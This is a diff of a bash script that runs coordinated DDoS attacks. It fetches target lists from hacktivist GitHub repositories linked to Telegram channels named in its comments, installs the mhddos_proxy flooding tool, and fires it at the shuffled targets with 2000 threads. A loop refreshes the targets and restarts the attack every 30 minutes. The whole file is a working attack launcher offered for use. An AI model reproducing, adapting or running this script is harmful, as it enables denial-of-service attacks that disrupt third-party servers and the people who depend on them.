@@ -38,10 +38,11 @@ if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default
 
 ### prepare target files and show banner
 prepare_targets_and_banner () {
-[ -d /var/tmp/uaripper ] && rm -rf /var/tmp/uaripper/* || mkdir /var/tmp/uaripper/
+[ -d /var/tmp/uaripper ] && rm -rf /var/tmp/uaripper/* || mkdir /var/tmp/uaripper/ # clean working folder or create it if it doesn't exist
 
-# all our sources
+# DDOS по країні СЕПАРІВ (Кібер-Козаки)         https://t.me/ddos_separ
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > /var/tmp/uaripper/source1.txt
+# IT ARMY of Ukraine            https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > /var/tmp/uaripper/source2.txt
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > /var/tmp/uaripper/source3.txt
 
@@ -55,7 +56,7 @@ done
 # delete duplicates, randomize order and save final targets in uniq_targets.txt
 cat /var/tmp/uaripper/all_targets.txt | sort | uniq | sort -R > /var/tmp/uaripper/uniq_targets.txt
 
-# Print greetings and number of targets; yes, utility name "toilet" is unfortunate
+# Print greetings and number of targets; yes, app name "toilet" is unfortunate
 clear
 toilet -t --metal "Український"
 toilet -t --metal "   жнець"
@@ -124,7 +125,7 @@ done
 prepare_targets_and_banner
 
 # create small separate script to re-launch only this small part of code
-cat > auto_bash.sh << 'EOF'
+cat > ~/multidd/auto_bash.sh << 'EOF'
 # Restart and update everything (mhddos_proxy and targets) every 30 minutes
 while true; do
     #install mhddos_proxy
@@ -134,7 +135,7 @@ while true; do
     python3 -m pip install -r requirements.txt
 
     if [[ $lite == "on" ]]; then
-        tail -n 2000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
+        tail -n 1000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
         cd /var/tmp/uaripper/; split -n l/2 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in 2
